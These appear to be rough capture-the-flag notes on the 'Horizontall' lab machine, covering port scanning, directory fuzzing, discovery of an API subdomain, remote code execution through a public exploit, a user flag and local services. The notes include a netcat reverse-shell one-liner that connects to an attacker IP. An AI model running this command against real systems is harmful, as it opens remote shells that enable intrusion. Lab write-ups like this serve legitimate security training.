start with nmap.

80
22

***

http

http://horizontall.htb/ --> ffuf with diferent list, nothing foudn(does not fuff with extention)


in view-source:http://horizontall.htb/js/app.c68eb462.js found url 
http://api-prod.horizontall.htb/

ffuf : 

admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
Admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
ADMIN                   [Status: 200, Size: 854, Words: 98, Lines: 17]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1]
index.html              [Status: 200, Size: 413, Words: 76, Lines: 20]
reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1]
robots.txt              [Status: 200, Size: 121, Words: 19, Lines: 4]
users                   [Status: 403, Size: 60, Words: 1, Lines: 1]

used exploit 50239.py on subdomain. got rce with below payload.(used lot of , this worked)

mkfifo /tmp/lol;nc 10.10.14.114 1234 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol

get shell as strapi

user found on box : developer 

user.txt : 441607bd8759af02e07677f582a6e9bf


tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1820/node /usr/bin/                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                                     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -     

we can upload php shell on box. and 1337 is open for developement purpose.

check if mongo db is present on server . try to login